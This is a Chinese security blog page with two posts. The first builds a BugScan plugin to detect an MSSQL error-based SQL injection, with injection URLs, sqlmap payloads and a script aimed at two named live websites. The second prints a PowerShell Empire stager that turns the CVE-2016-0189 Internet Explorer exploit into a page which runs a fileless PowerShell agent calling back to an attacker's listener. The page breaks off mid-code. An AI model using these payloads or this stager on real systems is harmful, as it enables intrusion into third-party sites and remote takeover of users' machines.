<!doctype html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="ZEROYU, SEC" />





  <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="一只单线程HACKER">
<meta property="og:type" content="website">
<meta property="og:title" content="ZEROYU">
<meta property="og:url" content="http://zer0yu.github.io/index.html">
<meta property="og:site_name" content="ZEROYU">
<meta property="og:description" content="一只单线程HACKER">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ZEROYU">
<meta name="twitter:description" content="一只单线程HACKER">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://zer0yu.github.io/"/>





  <title> ZEROYU </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?414e74bab07e7101a26a8ca95416288a";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">ZEROYU</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/BugScan插件编写/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/BugScan插件编写/" itemprop="url">
                  BugScan插件编写
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:23:35+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/BugScan插件编写/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/BugScan插件编写/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/BugScan插件编写/" class="leancloud_visitors" data-flag-title="BugScan插件编写">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p>
<p>下面就让我们看看这个题目：</p>
<p>某通用平台被曝出有一处高危注入，以下为详情：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>www.exploit.com<span class="regexp">/livefiles/</span>pages<span class="regexp">/inner/u</span>serlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=<span class="number">1</span></div></pre></td></tr></table></figure>
<p>userName处为一处报错注入，</p>
<p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.jmsyzx.com/</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//www.globechildren.com/</span></div></pre></td></tr></table></figure>
<p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p>
<p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=@<span class="title">@version--</span></div></pre></td></tr></table></figure>
<p>也可以sqlmap跑一下看看：</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] resuming back-end DBMS <span class="symbol">'microsoft</span> sql server'</div><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] testing connection to the target URL</div><div class="line">sqlmap resumed the following injection point(<span class="name">s</span>) from stored session:</div><div class="line">---</div><div class="line">Parameter: userName (<span class="name">GET</span>)</div><div class="line">Type: error-based</div><div class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' AND <span class="number">2390</span>=CONVERT(<span class="name">INT</span>,(<span class="name">SELECT</span> CHAR(<span class="name">113</span>)+CHAR(<span class="name">107</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">113</span>)+CHAR(<span class="name">113</span>)+(<span class="name">SELECT</span> (<span class="name">CASE</span> WHEN (<span class="name">2390=2390</span>) THEN CHAR(<span class="name">49</span>) ELSE CHAR(<span class="name">48</span>) END))+CHAR(<span class="name">113</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">112</span>)+CHAR(<span class="name">118</span>)+CHAR(<span class="name">113</span>))) AND <span class="symbol">'nTAv</span><span class="symbol">'=</span><span class="symbol">'nTAv</span></div><div class="line">Type: stacked queries</div><div class="line">Title: Microsoft SQL Server/Sybase stacked queries (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1'<span class="comment">;WAITFOR DELAY '0:0:5'--</span></div><div class="line">Type: AND/OR time-based blind</div><div class="line">Title: Microsoft SQL Server/Sybase time-based blind (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' WAITFOR DELAY <span class="symbol">'0:0:5</span><span class="symbol">'--</span></div><div class="line">---</div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] the back-end DBMS is Microsoft SQL Server</div><div class="line">web server operating system: Windows <span class="number">2008</span> R2 or <span class="number">7</span></div><div class="line">web application technology: ASP.NET, Microsoft IIS <span class="number">7.5</span></div><div class="line">back-end DBMS: Microsoft SQL Server <span class="number">2005</span></div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] fetched data logged to text files under <span class="symbol">'C:</span>\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com'</div></pre></td></tr></table></figure>
<p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p>
<p>打印MD5呢，mssql有两种方式：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_sqlvarbasetostr(HashBytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%27123456</span><span class="symbol">%27</span>))--</div><div class="line"></div><div class="line"><span class="number">2</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_varbintohexstr(hashbytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%271234</span><span class="symbol">%27</span>))--</div></pre></td></tr></table></figure>
<p>直接上我写的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/evn python</span></div><div class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">POC Name : 泡妹专享</div><div class="line">Author : zeroyu</div><div class="line">mail : zeroyu.xyz@gmail.com</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line">	<span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">	payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></div><div class="line">	url = arg + payload</div><div class="line">	code, head, res, errcode, _ = hackhttp.http(url)</div><div class="line">	time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</div><div class="line">		security_hole(url)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">	<span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">	audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>
<p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="external">文档</a>去。</p>
<p>好，今天妹子就泡到这儿。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="url">
                  POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:21:47+08:00">
                2017-01-22
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" class="leancloud_visitors" data-flag-title="POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。<br>在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></div><div class="line"></div><div class="line">        self.info = &#123;</div><div class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</div><div class="line"></div><div class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</div><div class="line"></div><div class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</div><div class="line"></div><div class="line">            <span class="string">'Comments'</span>: [</div><div class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></div><div class="line">        self.options = &#123;</div><div class="line">            <span class="comment"># format:</span></div><div class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></div><div class="line">            <span class="string">'Listener'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'StagerRetries'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'OutFile'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Base64'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></div><div class="line">            &#125;,            </div><div class="line">            <span class="string">'UserAgent'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Proxy'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'ProxyCreds'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></div><div class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></div><div class="line">        self.mainMenu = mainMenu</div><div class="line"></div><div class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">            <span class="comment"># parameter format is [Name, Value]</span></div><div class="line">            option, value = param</div><div class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</div><div class="line">                self.options[option][<span class="string">'Value'</span>] = value</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        <span class="comment"># extract all of our options</span></div><div class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</div><div class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</div><div class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</div><div class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</div><div class="line"></div><div class="line">        encode = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</div><div class="line">            encode = <span class="keyword">True</span></div><div class="line"></div><div class="line">        <span class="comment"># generate the launcher code</span></div><div class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</div><div class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">			code =  <span class="string">"&lt;html&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;body&gt;\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        Dim aw\n"</span></div><div class="line">			code += <span class="string">"        Dim plunge(32)\n"</span></div><div class="line">			code += <span class="string">"        Dim y(32)\n"</span></div><div class="line">			code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></div><div class="line">			code += <span class="string">"        b = String(64000, \"D\")\n"</span></div><div class="line">			code += <span class="string">"        c = d &amp; b\n"</span></div><div class="line">			code += <span class="string">"        x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"            Dim A()\n"</span></div><div class="line">			code += <span class="string">"            Private Sub Class_Initialize\n"</span></div><div class="line">			code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></div><div class="line">			code += <span 